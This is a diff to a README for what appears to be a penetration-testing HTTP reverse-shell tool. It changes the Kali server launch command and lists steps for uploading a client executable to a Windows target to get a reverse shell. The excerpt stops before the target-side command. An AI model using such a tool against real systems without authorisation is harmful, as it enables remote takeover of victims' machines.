@@ -18,7 +18,7 @@ If I get some time, I will convert this to a python3 project.
 ## Usage:
 1. Run server_shell_http.py from kali (and choose port 80)
 ```
-sudo python2 server_shell_http.py <kali_ip>
+sudo python2 server_shell_http.py
 ```
 2. Upload client_shell_http.exe to Windows target
 3. Run the following command on the target for a reverse shell without proxy:
